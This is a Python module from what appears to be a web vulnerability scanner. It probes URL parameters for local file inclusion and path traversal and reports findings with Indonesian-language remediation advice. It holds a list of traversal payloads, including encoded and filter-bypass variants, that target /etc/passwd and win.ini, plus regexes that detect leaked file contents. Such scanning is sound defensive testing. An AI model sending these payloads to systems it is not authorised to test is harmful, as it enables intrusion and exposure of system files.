"""Local File Inclusion / Path Traversal probes."""
from __future__ import annotations

import re

from cyberloka.active._helpers import append_param, collect_target_urls, iter_param_urls
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
]

PASSWD_RE = re.compile(r"root:[x*]:0:0:")
WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]", re.I)


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        for url in collect_target_urls(target, default_param="file"):
            for payload in PAYLOADS:
                stop = False
                for param, mutated in iter_param_urls(url, payload):
                    resp = client.get(mutated)
                    if resp is None:
                        continue
                    body = resp.text or ""
                    if PASSWD_RE.search(body) or WIN_INI_RE.search(body):
                        findings.append(
                            Finding(
                                module="lfi",
                                title=f"Local File Inclusion / Path Traversal pada `{param}`",
                                severity=Severity.CRITICAL,
                                description=(
                                    "Konten file sistem (mis. /etc/passwd atau win.ini) berhasil "
                                    "diakses lewat parameter aplikasi."
                                ),
                                target=mutated,
                                evidence=truncate(body, 240),
                                cwe="CWE-22",
                                remediation=(
                                    "Jangan menerima path file dari user. Gunakan whitelist nama "
                                    "file/identifier dan map ke path internal. Lakukan canonicalisasi "
                                    "path lalu cek apakah tetap di dalam direktori yang diizinkan."
                                ),
                                references=[
                                    "https://owasp.org/www-community/attacks/Path_Traversal",
                                ],
                            )
                        )
                        stop = True
                        break
                if stop:
                    return findings
    finally:
        client.close()
    return findings
